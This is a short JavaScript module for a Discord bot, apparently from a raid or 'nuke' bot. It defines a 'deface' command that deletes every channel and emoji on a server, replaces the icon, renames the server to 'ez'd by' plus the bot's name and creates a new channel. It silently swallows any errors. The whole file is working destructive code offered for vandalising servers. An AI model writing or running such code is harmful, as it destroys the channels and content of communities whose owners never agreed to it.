module.exports = {
    name: "deface",
    description: "deletes all the shits on a server",
    func: async function(message, args, client) {
        try {
            message.guild.channels.forEach(c => c.delete())
            message.guild.setIcon(args[1] || "https://avatars.githubusercontent.com/u/78520042?v=4")
            message.guild.setName(args[2] || `ez'd by ${client.user.username}`)
            message.guild.emojis.forEach(e => e.delete())
            message.guild.createChannel(args[3] || "ez", { type: text })
        } catch (e) {}
    }
}